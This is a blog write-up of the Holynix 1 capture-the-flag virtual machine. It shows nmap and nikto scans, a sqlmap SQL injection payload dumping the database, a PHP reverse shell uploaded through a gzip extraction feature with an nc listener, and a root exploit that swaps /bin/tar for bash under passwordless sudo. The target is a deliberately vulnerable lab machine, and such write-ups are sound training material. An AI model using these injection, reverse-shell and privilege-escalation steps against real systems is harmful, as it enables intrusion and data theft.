---
layout: post
title: "Holynix hacking challenge: Part 1"
date: 2012-04-07 18:10:26 -0400
comments: true
categories: boot2root hacking
alias: /2012/04/holynix-hacking-challenge-part-1.html
---

I've been playing a few of these hacking challenges over the past few months, some are extremely easy, while others force you to think out of the box. Completing a challenge is rewarding, but the journey to completion is sometimes fraught with frustration. In this post I'm going to be describing how I completed the Holynix 1 challenge. Holynix 1 can be downloaded from [http://sourceforge.net/projects/holynix/files/1.0/](http://sourceforge.net/projects/holynix/files/1.0/) As before I'll be using Backtrack Linux to perform the attack and running Holynix on VMware. Both machines were running on the same network, so a netdiscover revealed the IP address of the target. I ran nmap against the target and pointed my browser to that IP address to see if a website was present:

<!--more-->

![](/images/2012-04-07/01.png)

![](/images/2012-04-07/02.png)

I found a login form on the website. I thought this might be vulnerable to a SQL injection attack, and I would try sqlmap against it later. In the meantime, I looked at the nmap report:

```
# nmap -sS -T4 -A -O 192.168.1.155 
 
Starting Nmap 5.61TEST4 ( http://nmap.org ) at 2012-04-07 17:31 EDT
Nmap scan report for 192.168.1.155
Host is up (0.00054s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.12 with Suhosin-Patch)
|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 00:0C:29:BC:05:DE (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:kernel:2.6
OS details: Linux 2.6.24 - 2.6.25
Network Distance: 1 hop
 
TRACEROUTE
HOP RTT     ADDRESS
1   0.54 ms 192.168.1.155
 
OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.82 seconds
```

Nothing except port 80 was open. I decided to run nikto and sqlmap against the target. Here's what nikto reported:

```
# ./nikto.pl -host 192.168.1.155
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          192.168.1.155
+ Target Hostname:    192.168.1.155
+ Target Port:        80
+ Start Time:         2012-04-07 17:34:31 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.12 with Suhosin-Patch
+ Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.12
+ PHP/5.2.4-2ubuntu5.12 appears to be outdated (current is at least 5.3.6)
+ Apache/2.2.8 appears to be outdated (current is at least Apache/2.2.19). Apache 1.3.42 (final release) and 2.0.64 are also current.
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ /index.php?page=../../../../../../../../../../etc/passwd: PHP include error may indicate local or remote file inclusion is possible.
+ /index.php?page=../../../../../../../../../../boot.ini: PHP include error may indicate local or remote file inclusion is possible.
+ OSVDB-12184: /index.php?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-2562: /login/sm_login_screen.php?error=\"><script>alert('Vulnerable')</script>: SPHERA HostingDirector and Final User (VDS) Control Panel 1-3 are vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
+ OSVDB-2562: /login/sm_login_screen.php?uid=\"><script>alert('Vulnerable')</script>: SPHERA HostingDirector and Final User (VDS) Control Panel 1-3 are vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
+ OSVDB-3092: /home/: This might be interesting...
+ OSVDB-3092: /img/: This might be interesting...
+ OSVDB-3092: /login/: This might be interesting...
+ OSVDB-3092: /misc/: This might be interesting...
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /index.php?module=PostWrap&page=http://cirt.net/rfiinc.txt?: PHP include error may indicate local or remote file inclusion is possible.
+ /index.php?page=http://cirt.net/rfiinc.txt?: PHP include error may indicate local or remote file inclusion is possible.
+ /index.php?page=http://cirt.net/rfiinc.txt?: PHP include error may indicate local or remote file inclusion is possible.
+ /index.php?page=http://cirt.net/rfiinc.txt??: PHP include error may indicate local or remote file inclusion is possible.
+ /index.php?page[path]=http://cirt.net/rfiinc.txt??&cmd=ls: PHP include error may indicate local or remote file inclusion is possible.
+ /login.php: Admin login page/section found.
+ 6474 items checked: 1 error(s) and 22 item(s) reported on remote host
+ End Time:           2012-04-07 17:35:04 (GMT-4) (33 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Some interesting things there, particularly the local/remote file inclusion attacks. These could be used to read PHP files or the /etc/passwd file to get a list of users on the system. I saved the output for later analysis and ran sqlmap to see if it could find any SQL injection attacks. Since sqlmap is very verbose, I've posted only the interesting bits here:

```
# ./sqlmap.py --url "http://192.168.1.155/?page=login.php" --forms --dump-all
 
    sqlmap/1.0-dev (r4766) - automatic SQL injection and database takeover tool
    http://www.sqlmap.org
 
[!] legal disclaimer: usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Authors assume no liability and are not responsible for any misuse or damage caused by this program
 
[*] starting at 17:41:09
 
[17:41:09] [INFO] testing connection to the target url
[17:41:09] [INFO] heuristics detected web page charset 'ascii'
[17:41:09] [INFO] searching for forms
[#1] form:
POST http://192.168.1.155:80/index.php?page=login.php
POST data: user_name=&password=&Submit_button=Submit
do you want to test this form? [Y/n/q] 
> 
Edit POST data [default: user_name=&password=&Submit_button=Submit] (Warning: blank fields detected): 
do you want to fill blank fields with random values? [Y/n] 
[17:41:22] [INFO] using '/pentest/database/sqlmap/output/192.168.1.155/session' as session file
[17:41:22] [INFO] using '/pentest/database/sqlmap/output/results-04072012_0541pm.csv' as results file
[17:41:22] [INFO] heuristics detected web page charset 'ascii'
[17:41:22] [INFO] testing if the url is stable, wait a few seconds
```

Above, I told sqlmap to dump everything it found if a SQL injection exploit was possible. It recognized the login form and asked if I wanted to submit any specific values. I went with the defaults which are random values.

```
[17:41:36] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
POST parameter 'password' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
sqlmap identified the following injection points with a total of 193 HTTP(s) requests:
---
Place: POST
Parameter: password
    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
    Payload: user_name=pSKR&password=Loxw' AND (SELECT 9364 FROM(SELECT COUNT(*),CONCAT(0x3a6d737a3a,(SELECT (CASE WHEN (9364=9364) THEN 1 ELSE 0 END)),0x3a68646c3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'iUcM'='iUcM&Submit_button=Submit
---
 
do you want to exploit this SQL injection? [Y/n]
```

The password parameter was vulnerable to SQL injection. I confirm that I want it to exploit that field and it dumped all the tables in the database. At some point it found passwords and asked if I wanted to crack them. I say no, this can be done later on in the background, better to let sqlmap finish dumping all the tables.

```
[17:56:09] [INFO] Table 'mysql.user' dumped to CSV file '/pentest/database/sqlmap/output/192.168.1.155/dump/mysql/user.csv'
[17:56:09] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/pentest/database/sqlmap/output/results-04072012_0541pm.csv'
 
[*] shutting down at 17:56:09
```

Once it had completed running, it was time to examine the dump files. Two databases were found aside from mysql and information_schema:

```
# ls -l
total 16
drwxr-xr-x 2 root root 4096 2012-04-07 17:44 clients
drwxr-xr-x 2 root root 4096 2012-04-07 17:44 creds
drwxr-xr-x 2 root root 4096 2012-04-07 17:48 information_schema
drwxr-xr-x 2 root root 4096 2012-04-07 17:56 mysql
```

I looked at the contents of the clients directory and found two tables inside, accounts and credits. The accounts table contained what appeared to be client information including credit card numbers:

```
# cat clients/accounts.csv 
address,CCN,cid,email,exp,name,phone,surname,type
"3965 Willis Ave:Daytona Beach, FL 32114",4485 6129 3846 3674,11,WinnieMFischer@example.org,12/2011,Winnie,386-323-1724,Fischer,Visa
"4970 Haven Ln:Lansing, MI 48933",4485 9777 7807 3283,27,MichaelMahler@example.org,10/2014,Michael,517-652-8204,Mahler,Visa
"4253 Hummingbird Way:Cambridge, MA 02141",4539 1640 5255 9206,18,ArthurRBailey@example.org,3/2012,Arthur,781-994-7119,Bailey,Visa
"4011 Randall Dr:Kawaihae, HI 96743",4539 1845 7920 4698,17,MarthaCFrost@example.org,5/2015,Martha,808-880-6054,Frost,Visa
"4834 Freed Dr:Stockton, CA 95202",4716 1304 2847 6396,29,JessicaDuerr@example.org,10/2012,Jessica,209-679-1447,Duerr,Visa
```

The credits table had text thanking various people, nothing of interest to the attack. I looked into the contents of the creds database:

```
# ls -l
total 28
-rw-r--r-- 1 root root  348 2012-04-07 17:44 accounts.csv
-rw-r--r-- 1 root root 5208 2012-04-07 17:44 blogs_table.csv
-rw-r--r-- 1 root root 1026 2012-04-07 17:44 calender.csv
-rw-r--r-- 1 root root 5180 2012-04-07 17:44 employee.csv
-rw-r--r-- 1 root root  117 2012-04-07 17:44 page.csv
```

Several tables were dumped. The accounts table contained several usernames and passwords:

```
# cat accounts.csv 
cid,password,upload,username
1,Ih@cK3dM1cR05oF7,0,alamo
2,P3n7@g0n0wN3d,1,etenenbaum
3,d15cL0suR3Pr0J3c7,1,gmckinnon
4,Ik1Ll3dNiN@r315er,1,hreiser
5,p1@yIngW17hPh0n35,1,jdraper
6,@rR35t3D@716,1,jjames
7,m@k1nGb0o7L3g5,1,jljohansen
8,wH@7ar37H3Fed5D01n,1,kpoulsen
9,f@7H3r0FL1nUX,0,ltorvalds
10,n@5aHaSw0rM5,1,mrbutler
11,Myd@d51N7h3NSA,1,rtmorris
```

I thought these might be the login credentials to the server or to the website. The other tables provided more information, the blogs_table has some blog posts but was a bit difficult to read with the current formatting. I thought if I logged into the website it might be easier to read. The employees table listed employee information including email addresses and phone numbers, the calendar table listed events, and the page table listed several PHP files - possibly pages that the website recognizes. I decided it was time to log into the website. I picked user etenenbaum because the upload field in the accounts table for his entry was set to 1, which usually means true. Using his credentials, I gained access into the website: 

![](/images/2012-04-07/03.png)

I started exploring the website. The Message Board section had some interesting information. Looks like they use knockknock which adds an extra layer of security to the server when trying to SSH into it. Essentially, a port knock is required before the SSH port is opened to allow the user to connect. Instructions are provided on how to setup knockknock so a user can connect. The Upload section allows a user to upload files to their home directories. I point my browser to etenenbaum's page to see if there was anything of interest: 

![](/images/2012-04-07/04.png)

I decided to try to upload something. On the upload page I have the option of having a gzip'd file automatically extracted. Not sure what that meant at the time, so I created two text files and gzip'd one of them. I wanted to upload both files to see what would happen.

```
# echo "hello world" > test1.txt
# echo "hello world" > test2.txt
# tar czf test2.tar.gz test2.txt 
# ls -l
total 12
-rw-r--r-- 1 root root  12 2012-04-07 18:30 test1.txt
-rw-r--r-- 1 root root 130 2012-04-07 18:31 test2.tar.gz
-rw-r--r-- 1 root root  12 2012-04-07 18:30 test2.txt
```

I uploaded test1.txt and test2.tar.gz and went back to etenenbaum's page. Both files were uploaded, but only test2.txt was readable. This meant that I could upload any file I wanted to the site, provided it was gzip'd. I decided to try a PHP reverse shell. I grabbed a PHP reverse shell from from [pentestmonkey.net](http://pentestmonkey.net/tools/web-shells/php-reverse-shell), edited it with my machine's IP address and port to listen to, gzip'd it, and uploaded it. I started nc to listen for the connection and launched clicked on the rshell.php link on etenenbaum's page:

```
# nc -lvp 9998
listening on [any] 9998 ...
192.168.1.155: inverse host lookup failed: Unknown server error : Connection timed out
connect to [192.168.1.154] from (UNKNOWN) [192.168.1.155] 52587
Linux holynix 2.6.24-26-server #1 SMP Tue Dec 1 19:19:20 UTC 2009 i686 GNU/Linux
 12:46:11 up  2:55,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: can't access tty; job control turned off
$ 
```

Success, I had gained shell access to the server. First thing I did was to check for sudo access.

```
$ sudo -l
User www-data may run the following commands on this host:
    (root) NOPASSWD: /bin/chown
    (root) NOPASSWD: /bin/chgrp
    (root) NOPASSWD: /bin/tar
    (root) NOPASSWD: /bin/mv
```

Those are a lot of commands and no password required to run them. Here's what I did to root the machine:

```
$ cd /tmp/   
$ cp /bin/bash .
$ sudo chown root:root /tmp/bash
$ sudo mv /bin/tar /bin/tar.orig
$ sudo mv /tmp/bash /bin/tar
$ sudo /bin/tar
id
uid=0(root) gid=0(root) groups=0(root)
```

So a quick breakdown on what I did here was to copy /bin/bash to /tmp, backup /bin/tar, move /tmp/bash to /bin as tar, and then sudo /bin/tar which is essentially running sudo /bin/bash. This results in temporarily making the tar command unavailable, but getting the root shell.

At this point the game is over. However, there is another solution to gaining root, the one that the developer probably intended. To summarize, it involves downloading the contents of /etc/knockknock.d and using the profiles contained within to SSH into the server as one of the users in the developer group. There is an exploit for the changetrack command which allows a user to gain root access to the machine.

Overall an interesting challenge. I was able to root the machine in a different way by taking advantage of the non-password protected sudo commands that were granted to the www-data user. 
